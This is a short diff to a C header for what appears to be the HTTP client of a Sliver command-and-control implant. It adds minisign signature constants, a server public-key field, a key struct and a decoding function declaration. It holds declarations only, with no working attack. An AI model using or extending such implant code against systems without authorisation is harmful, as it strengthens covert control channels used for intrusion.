@@ -1,5 +1,8 @@
 #pragma once
 
+#define MINISIGN_SIZE (74)
+#define RAW_SIG_SIZE (2 + 8 + ED25519_SIGNATURE_SIZE)
+
 typedef enum _HttpMethod {
 	GET,
 	POST,
@@ -201,6 +204,7 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	DWORD dwTlsTimeout;
 	DWORD dwPollTimeout;
 	DWORD dwMaxErrors;
+	LPSTR lpServerMinisignPublicKey;
 } SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;
 
 typedef enum {
@@ -222,6 +226,12 @@ typedef struct _HTTP_RESP {
 	DWORD dwStatusCode;
 	HINTERNET hRequest;
 } HTTP_RESP, *PHTTP_RESP;
+
+typedef struct _MINISIGN_PUB_KEY {
+	UINT16 SignatureAlgorithm;
+	BYTE KeyId[8];
+	BYTE PublicKey[32];
+} MINISIGN_PUB_KEY, *PMINISIGN_PUB_KEY;
 
 PHTTP_CLIENT HttpClientInit
 (
@@ -303,4 +313,9 @@ LPSTR SliverBase64Encode
 (
 	_In_ PBYTE lpInput,
 	_In_ DWORD cbInput
+);
+
+PMINISIGN_PUB_KEY DecodeMinisignPublicKey
+(
+	_In_ LPSTR lpInput
 );
